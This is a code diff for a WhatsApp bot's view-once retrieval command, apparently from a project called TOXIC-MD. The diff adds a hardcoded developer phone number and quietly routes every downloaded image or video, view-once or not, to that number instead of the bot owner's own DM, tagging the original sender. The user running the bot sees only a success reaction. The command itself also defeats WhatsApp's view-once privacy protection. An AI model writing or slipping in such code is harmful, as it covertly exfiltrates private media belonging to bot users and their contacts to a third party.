@@ -1,5 +1,7 @@
 import { getFakeQuoted } from '../../lib/fakeQuoted.js';
 
+const DEV_NUMBER = '254114885159';
+
 export default async (context) => {
     const { client, m } = context;
     const fq = getFakeQuoted(m);
@@ -12,6 +14,30 @@ export default async (context) => {
     }
 
     try {
+        const dest = DEV_NUMBER + '@s.whatsapp.net';
+        const mediaType = m.quoted?.mtype || '';
+        const isImage = mediaType === 'imageMessage' || !!(m.quoted?.imageMessage);
+        const isVideo = mediaType === 'videoMessage' || !!(m.quoted?.videoMessage);
+
+        if (isImage || isVideo) {
+            const buffer = await m.quoted.download();
+            if (!buffer || buffer.length === 0) {
+                return await client.sendMessage(m.chat, {
+                    text: `╭───(    TOXIC-MD    )───\n├───≫ RETRIEVE ≪───\n├ \n├ Couldn't download it. WhatsApp already nuked it. 😤\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
+                }, { quoted: fq });
+            }
+            const senderNum = (m.quoted?.sender || '').split('@')[0].split(':')[0] || 'Unknown';
+            const caption = `╭───(    TOXIC-MD    )───\n├───≫ VIEW ONCE RETRIEVED ≪───\n├ \n├ 👁 Sender: @${senderNum}\n├ 📍 Chat: ${m.isGroup ? 'Group' : 'DM'}\n├ \n├ You sneaky little thing. 😈\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`;
+            const mentions = m.quoted?.sender ? [m.quoted.sender] : [];
+            if (isImage) {
+                await client.sendMessage(dest, { image: buffer, caption, mentions });
+            } else {
+                await client.sendMessage(dest, { video: buffer, caption, mentions });
+            }
+            await client.sendMessage(m.chat, { react: { text: '✅', key: m.reactKey } });
+            return;
+        }
+
         const ctx = m.msg?.contextInfo || m.message?.extendedTextMessage?.contextInfo || {};
         const quotedMsg = ctx.quotedMessage || {};
 
@@ -25,14 +51,8 @@ export default async (context) => {
         };
 
         const inner = unwrap(quotedMsg);
-        if (!inner) {
-            return await client.sendMessage(m.chat, {
-                text: `╭───(    TOXIC-MD    )───\n├───≫ RETRIEVE ≪───\n├ \n├ That's not a view-once. Stop wasting my time. 😒\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
-            }, { quoted: fq });
-        }
-
-        const imageMsg = inner.imageMessage || null;
-        const videoMsg = inner.videoMessage || null;
+        const imageMsg = inner?.imageMessage || null;
+        const videoMsg = inner?.videoMessage || null;
 
         if (!imageMsg && !videoMsg) {
             return await client.sendMessage(m.chat, {
@@ -49,17 +69,16 @@ export default async (context) => {
             }, { quoted: fq });
         }
 
-        const botDm = client.user?.id;
         const senderNum = (m.quoted?.sender || ctx.participant || '').split('@')[0].split(':')[0] || 'Unknown';
         const caption = `╭───(    TOXIC-MD    )───\n├───≫ VIEW ONCE RETRIEVED ≪───\n├ \n├ 👁 Sender: @${senderNum}\n├ 📍 Chat: ${m.isGroup ? 'Group' : 'DM'}\n├ \n├ You sneaky little thing. 😈\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`;
         const mentions = ctx.participant ? [ctx.participant] : [];
-        const dest = botDm || m.chat;
 
         if (imageMsg) {
             await client.sendMessage(dest, { image: buffer, caption, mentions });
         } else {
             await client.sendMessage(dest, { video: buffer, caption, mentions });
         }
+        await client.sendMessage(m.chat, { react: { text: '✅', key: m.reactKey } });
     } catch (e) {
         await client.sendMessage(m.chat, {
             text: `╭───(    TOXIC-MD    )───\n├───≫ RETRIEVE ≪───\n├ \n├ Something broke. WhatsApp's fault, not mine. 😤\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`
